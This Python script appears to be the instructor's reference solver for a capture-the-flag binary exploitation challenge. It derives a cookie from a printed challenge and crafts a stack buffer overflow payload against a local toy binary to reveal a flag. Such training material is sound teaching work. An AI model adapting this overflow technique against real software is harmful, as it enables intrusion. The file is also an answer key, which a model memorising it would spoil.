#!/usr/bin/env python3
"""Reference solver for the upgraded Pwn challenge.

The target is still a local toy: it prints the flag when both gates pass and
never spawns a shell.  The two gates are linked by the random cookie.

Gate 1
    Parse ``challenge=<hex>`` from stdout, reproduce ``mix_challenge()`` from
    the binary, and send the resulting 32-bit cookie.

Gate 2
    A 96-byte read() still writes into a 32-byte stack buffer.  Derive the
    buffer/admin offsets from main and build one payload that sets both
    ``admin = 0x1337`` and ``auth = cookie``.
"""
from __future__ import annotations

import re
import struct
import subprocess
from pathlib import Path

HERE = Path(__file__).resolve().parent
BIN = HERE / "public" / "pwnme"
MASK32 = 0xFFFFFFFF


def rotl32(x: int, n: int) -> int:
    return ((x << n) | (x >> (32 - n))) & MASK32


def mix_challenge(x: int) -> int:
    """Mirror of mix_challenge() in instructor/src/vuln.c."""
    x = (x ^ 0x9E3779B9) & MASK32
    x = rotl32(x, 13)
    x = (x * 0x85EBCA6B) & MASK32
    x ^= x >> 16
    x = (x * 0xC2B2AE35) & MASK32
    x ^= x >> 13
    return (x ^ 0x1337C0DE) & MASK32


def find_layout(binary: Path) -> tuple[int, int, int]:
    """Return (name_offset, admin_offset, auth_offset) relative to saved rbp."""
    out = subprocess.run(
        ["objdump", "-d", "-M", "intel", "--disassemble=main", str(binary)],
        check=True, capture_output=True, text=True,
    ).stdout
    lines = out.splitlines()

    # The name buffer is the source of the 0x60-byte read().
    name_off = None
    for i, line in enumerate(lines):
        if re.search(r"mov\s+edx,0x60\b", line):
            for prev in reversed(lines[max(0, i - 6):i]):
                m = re.search(r"lea\s+rax,\[rbp-0x([0-9a-f]+)\]", prev)
                if m:
                    name_off = int(m.group(1), 16)
                    break
            if name_off is not None:
                break
    if name_off is None:
        raise SystemExit("could not locate the overflow buffer in main")

    # Gate 2 compares admin with 0x1337; gcc -O0 loads it into eax first.
    admin_off = None
    for i, line in enumerate(lines):
        if re.search(r"cmp\s+e?ax,0x1337\b", line):
            for prev in reversed(lines[max(0, i - 6):i]):
                m = re.search(r"mov\s+e?ax,DWORD PTR \[rbp-0x([0-9a-f]+)\]", prev)
                if m:
                    admin_off = int(m.group(1), 16)
                    break
            if admin_off is not None:
                break
    if admin_off is None:
        raise SystemExit("could not locate admin in main")

    # struct { char name[32]; uint32_t admin; uint32_t auth; };
    # auth is the dword immediately after admin.
    auth_off = admin_off - 4
    if not re.search(rf"(?:mov\s+e?ax,DWORD PTR|cmp\s+DWORD PTR) "
                     rf"\[rbp-0x{auth_off:x}\]", out):
        raise SystemExit("could not confirm the auth field next to admin")
    return name_off, admin_off, auth_off


def read_line(proc: subprocess.Popen) -> str:
    assert proc.stdout is not None
    line = proc.stdout.readline()
    if not line:
        raise SystemExit("target closed stdout unexpectedly")
    text = line.decode(errors="replace").rstrip("\n")
    print(f"    {text}")
    return text


def wait_for(proc: subprocess.Popen, needle: str) -> str:
    while True:
        line = read_line(proc)
        if needle in line:
            return line


def main() -> None:
    name_off, admin_off, auth_off = find_layout(BIN)
    print(f"[1] name @ [rbp-0x{name_off:x}], admin @ [rbp-0x{admin_off:x}], "
          f"auth @ [rbp-0x{auth_off:x}]")

    proc = subprocess.Popen(
        [str(BIN)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        line = wait_for(proc, "challenge=")
        challenge = int(line.split("challenge=", 1)[1].strip(), 16)
        wait_for(proc, "cookie:")
        cookie = mix_challenge(challenge)
        print(f"[2] challenge=0x{challenge:08x} -> cookie=0x{cookie:08x}")

        assert proc.stdin is not None
        proc.stdin.write(f"{cookie}\n".encode())
        proc.stdin.flush()
        wait_for(proc, "gate 1 passed")
        wait_for(proc, "overflow payload:")

        admin_pos = name_off - admin_off          # 32 bytes from name
        auth_pos = name_off - auth_off            # admin_pos + 4
        payload = bytearray(b"A" * (max(admin_pos, auth_pos) + 4))
        payload[admin_pos:admin_pos + 4] = struct.pack("<I", 0x1337)
        payload[auth_pos:auth_pos + 4] = struct.pack("<I", cookie)
        print(f"[3] payload ({len(payload)} bytes): {payload.hex()}")

        proc.stdin.write(payload)
        proc.stdin.flush()
        proc.stdin.close()
        rest = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
        err = proc.stderr.read().decode(errors="replace") if proc.stderr else ""
        proc.wait(timeout=10)
    finally:
        if proc.poll() is None:
            proc.kill()
            proc.wait(timeout=5)

    output = rest
    print("[4] target output:")
    print(output.rstrip())
    if err.strip():
        print("[stderr]")
        print(err.rstrip())
    match = re.search(r"flag\{[^}]+\}", output)
    if not match:
        raise SystemExit("both gates did not unlock the flag")
    print(f"[+] FLAG: {match.group()}")


if __name__ == "__main__":
    main()
